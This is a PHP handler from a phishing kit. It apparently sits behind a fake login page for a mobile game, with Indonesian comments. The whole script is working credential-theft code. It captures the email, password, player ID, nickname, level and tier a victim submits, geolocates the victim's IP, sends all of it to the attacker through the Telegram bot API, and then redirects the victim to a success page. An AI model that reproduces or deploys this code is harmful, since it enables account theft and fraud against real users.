<?php
include 'email.php';

$ip = $_SERVER['REMOTE_ADDR'];


    function getUserIP()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }

$ip = getUserIP();
$ccode = file_get_contents("https://ipapi.co/".$ip."/country_calling_code");
$country = file_get_contents("https://ipapi.co/".$ip."/country_name");

$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$nick = $_POST['nick'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$login = $_POST['login'];
$time = date("Y-m-d H:i:s");

// MENGAKIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI INPUT
if($email == "" && $password == "" && $playid == "" && $nick == "" && $level == "" && $tier == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT JANGAN DI UBAH NANTI EROR

$text = urlencode("
ʜɪ ɴᴇᴡ ᴀᴄᴄᴏᴜɴᴛ
━━━━━━━━━━━━
>> Type >> $login
>> Email >> $email
>> Password >> $password
>> Nickname >> $nick
>> level >> $level
>> Tier >> $tier
>> ID >> $playid
>> Call Code >> $ccode
>> Country >> $country
ᯓ ᴅᴀᴛᴇ » $time
━━━━━━━━━━━━
 𝙳𝙴𝚅 𝙱𝚈 @imnoob59 ˼
");

// SEND DATA KE BOT

$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED

if($url) {
echo "<form id='arpantek' method='POST' action='success.php'>
<input type='hidden' name='nick' value='$nick'>
</form>
<script type='text/javascript'>document.getElementById('arpantek').submit();</script>";
}
}
?>
